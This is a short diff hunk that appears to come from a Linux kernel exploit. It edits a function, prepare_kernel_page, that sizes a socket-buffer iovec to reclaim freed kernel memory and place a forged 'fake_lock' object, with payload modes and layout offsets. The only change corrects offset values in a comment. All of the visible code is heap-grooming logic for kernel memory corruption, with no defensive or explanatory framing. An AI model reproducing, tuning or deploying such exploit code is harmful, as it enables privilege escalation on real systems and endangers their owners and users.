@@ -701,7 +701,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   struct iovec iov;
   memset(&iov, 0, sizeof(iov));
   iov.iov_base = skb_buf;
-  iov.iov_len = SKB_RECLAIM_SIZE; /* 0x8e80: matches SKB_DATA_DELTA=-0xe80 layout; SKB_SEND_SIZE(0x10000) misplaces fake_lock */
+  iov.iov_len = SKB_RECLAIM_SIZE; /* 0x8e78: matches SKB_DATA_DELTA=-0xe78 layout; SKB_SEND_SIZE(0x10000) misplaces fake_lock */
 
   struct msghdr msg;
   memset(&msg, 0, sizeof(msg));
